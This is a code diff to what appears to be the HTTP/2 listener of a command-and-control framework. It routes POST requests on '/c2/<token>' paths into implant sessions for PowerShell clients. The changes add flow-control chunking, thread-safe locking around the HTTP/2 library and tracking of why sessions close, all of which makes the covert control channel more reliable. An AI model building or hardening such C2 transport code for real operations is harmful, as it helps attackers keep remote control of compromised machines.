@@ -14,6 +14,7 @@ Target:   PowerShell 7+ / .NET Core 3.1+ (HTTP/2 client support)
 import socket
 import ssl
 import threading
+import time
 
 try:
     import h2.config
@@ -49,17 +50,64 @@ class Http2SessionSocket:
     def sendall(self, data: bytes):
         if self.closed:
             raise OSError("http2 stream closed")
-        with self.send_lock:
-            if not self._hdr_sent:
-                self.h2_conn.send_headers(
-                    self.stream_id,
-                    [(b':status', b'200'),
-                     (b'content-type', b'application/octet-stream')],
-                    end_stream=False,
-                )
-                self._hdr_sent = True
-            self.h2_conn.send_data(self.stream_id, data, end_stream=False)
-            self.tls_sock.sendall(self.h2_conn.data_to_send())
+        if not data:
+            return
+        view     = memoryview(data)
+        offset   = 0
+        deadline = time.time() + 60.0   # budget for flow-control stalls
+
+        while offset < len(view):
+            progressed = False
+
+            # Acquire the SAME lock the listener uses for receive_data().
+            # Do NOT sleep while holding it — the listener needs this lock
+            # to process incoming WINDOW_UPDATE frames, which are what
+            # unblocks us when the peer's flow-control window is full.
+            with self.send_lock:
+                if self.closed:
+                    raise OSError("http2 stream closed")
+
+                if not self._hdr_sent:
+                    self.h2_conn.send_headers(
+                        self.stream_id,
+                        [(b':status', b'200'),
+                         (b'content-type', b'application/octet-stream')],
+                        end_stream=False,
+                    )
+                    self._hdr_sent = True
+
+                try:
+                    window = self.h2_conn.local_flow_control_window(
+                        self.stream_id)
+                except Exception as e:
+                    raise OSError("http2 flow-control query failed: %r" % (e,))
+
+                # Respect BOTH the peer's max frame size (default 16384,
+                # negotiated via SETTINGS) and the current flow-control
+                # window. A single send_data() must not exceed either.
+                frame_max = self.h2_conn.max_outbound_frame_size
+                n = min(len(view) - offset, window, frame_max)
+
+                if n > 0:
+                    self.h2_conn.send_data(
+                        self.stream_id,
+                        bytes(view[offset:offset + n]),
+                        end_stream=False,
+                    )
+                    try:
+                        self.tls_sock.sendall(self.h2_conn.data_to_send())
+                    except Exception as e:
+                        self.closed = True
+                        raise OSError("http2 send failed: %r" % (e,))
+                    offset += n
+                    progressed = True
+
+            if not progressed:
+                if time.time() > deadline:
+                    raise OSError("http2 flow-control window stalled")
+                # Release lock, let the listener thread receive
+                # WINDOW_UPDATEs, then retry.
+                time.sleep(0.05)
 
     def recv(self, n: int) -> bytes:
         if self.closed:
@@ -91,9 +139,25 @@ class Http2SessionSocket:
         if self.closed or not data:
             return
         try:
-            self.wfd.sendall(data)
+            self.wfd.setblocking(False)
         except Exception:
-            self.closed = True
+            pass
+        sent = 0
+        while sent < len(data):
+            try:
+                n = self.wfd.send(data[sent:])
+                if n <= 0:
+                    break
+                sent += n
+            except BlockingIOError:
+                break
+            except Exception:
+                # Do NOT mark the stream closed here. A transient write
+                # error on the socketpair must not poison the bridge —
+                # otherwise the next sendall() raises OSError and the
+                # caller calls cleanup_client() with reason 'unknown'.
+                # Just drop the overflow and keep the stream alive.
+                return
 
     def reset(self):
         self.closed = True
@@ -210,7 +274,12 @@ class Http2Listener:
         except Exception:
             return
 
-        send_lock = threading.Lock()
+        # hyper-h2 is NOT thread-safe. The listener thread calls
+        # receive_data() while plugin threads call send_data() through
+        # Http2SessionSocket.sendall. Both must be serialized by the
+        # same lock, or internal stream state gets corrupted and the
+        # next send_data() raises FlowControlError / ProtocolError.
+        conn_lock = threading.Lock()
         bridges = {}
 
         try:
@@ -221,81 +290,84 @@ class Http2Listener:
                     break
                 if not data:
                     break
-                try:
-                    events = conn.receive_data(data)
-                except Exception:
-                    break
 
-                for ev in events:
-                    if isinstance(ev, h2.events.RequestReceived):
-                        hdrs = {k: v for k, v in ev.headers}
-                        path   = hdrs.get(':path', '/')
-                        method = hdrs.get(':method', 'GET')
+                with conn_lock:
+                    try:
+                        events = conn.receive_data(data)
+                    except Exception:
+                        break
 
-                        token = None
-                        if method == 'POST' and path.startswith('/c2/'):
-                            token = path[4:].strip('/')
+                    for ev in events:
+                        if isinstance(ev, h2.events.RequestReceived):
+                            hdrs = {k: v for k, v in ev.headers}
+                            path   = hdrs.get(':path', '/')
+                            method = hdrs.get(':method', 'GET')
 
-                        if token:
-                            bridge = Http2SessionSocket(
-                                conn, ev.stream_id, tls_sock, addr, send_lock,
-                            )
-                            bridges[ev.stream_id] = bridge
-                            # Hand off to the handler; it looks up the token.
-                            try:
-                                self.handler.attach_http2_transport(
-                                    bridge, addr, token,
+                            token = None
+                            if method == 'POST' and path.startswith('/c2/'):
+                                token = path[4:].strip('/')
+
+                            if token:
+                                bridge = Http2SessionSocket(
+                                    conn, ev.stream_id, tls_sock, addr, conn_lock,
                                 )
-                            except Exception as exc:
+                                bridges[ev.stream_id] = bridge
+                                # attach_http2_transport only takes
+                                # self.client_lock; no deadlock with conn_lock.
                                 try:
-                                    bridge.close()
+                                    self.handler.attach_http2_transport(
+                                        bridge, addr, token,
+                                    )
                                 except Exception:
-                                    pass
-                        else:
-                            with send_lock:
+                                    try:
+                                        bridge.close()
+                                    except Exception:
+                                        pass
+                            else:
                                 conn.send_headers(
                                     ev.stream_id,
                                     [(b':status', b'404')],
                                     end_stream=True,
                                 )
+
+                        elif isinstance(ev, h2.events.DataReceived):
+                            bridge = bridges.get(ev.stream_id)
+                            if bridge is not None:
+                                bridge.feed(ev.data)
+                            try:
+                                conn.acknowledge_received_data(
+                                    ev.flow_controlled_length, ev.stream_id,
+                                )
+                            except Exception:
+                                pass
+
+                        elif isinstance(ev, h2.events.StreamEnded):
+                            bridge = bridges.pop(ev.stream_id, None)
+                            if bridge is not None:
+                                info = self.handler._client_info(bridge)
+                                if info is not None:
+                                    info['_last_h2_close_reason'] = 'stream_ended'
+                                bridge.reset()
                                 try:
-                                    tls_sock.sendall(conn.data_to_send())
+                                    self.handler.cleanup_client(bridge)
                                 except Exception:
                                     pass
 
-                    elif isinstance(ev, h2.events.DataReceived):
-                        bridge = bridges.get(ev.stream_id)
-                        if bridge is not None:
-                            bridge.feed(ev.data)
-                        try:
-                            conn.acknowledge_received_data(
-                                ev.flow_controlled_length, ev.stream_id,
-                            )
-                        except Exception:
-                            pass
+                        elif isinstance(ev, h2.events.StreamReset):
+                            bridge = bridges.pop(ev.stream_id, None)
+                            if bridge is not None:
+                                info = self.handler._client_info(bridge)
+                                if info is not None:
+                                    info['_last_h2_close_reason'] = 'stream_reset'
+                                bridge.reset()
+                                try:
+                                    self.handler.cleanup_client(bridge)
+                                except Exception:
+                                    pass
 
-                    elif isinstance(ev, h2.events.StreamEnded):
-                        bridge = bridges.pop(ev.stream_id, None)
-                        if bridge is not None:
-                            bridge.reset()
-                            try:
-                                self.handler.cleanup_client(bridge)
-                            except Exception:
-                                pass
+                        elif isinstance(ev, h2.events.ConnectionTerminated):
+                            return
 
-                    elif isinstance(ev, h2.events.StreamReset):
-                        bridge = bridges.pop(ev.stream_id, None)
-                        if bridge is not None:
-                            bridge.reset()
-                            try:
-                                self.handler.cleanup_client(bridge)
-                            except Exception:
-                                pass
-
-                    elif isinstance(ev, h2.events.ConnectionTerminated):
-                        return
-
-                with send_lock:
                     try:
                         out = conn.data_to_send()
                         if out:
@@ -304,6 +376,9 @@ class Http2Listener:
                         break
         finally:
             for b in bridges.values():
+                info = self.handler._client_info(b)
+                if info is not None:
+                    info.setdefault('_last_h2_close_reason', 'connection_teardown')
                 b.reset()
                 try:
                     self.handler.cleanup_client(b)
